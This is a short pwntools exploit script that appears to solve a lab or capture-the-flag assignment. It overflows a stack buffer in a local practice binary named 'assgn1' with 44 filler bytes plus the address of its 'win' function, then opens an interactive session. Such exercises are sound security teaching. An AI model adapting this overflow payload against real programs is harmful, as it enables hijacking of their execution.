#!/usr/bin/env python3

from pwn import *

exe = ELF("./assgn1")

context.binary = exe


def conn():
    r = process([exe.path])
    if args.D:
        gdb.attach(r)
    return r


def main():
    r = conn()
    log.info(str(hex(exe.symbols["win"])))
    r.sendline(b'A' * 44 + p32(exe.symbols["win"]))
    r.sendline(b'')
    r.interactive()


if __name__ == "__main__":
    main()
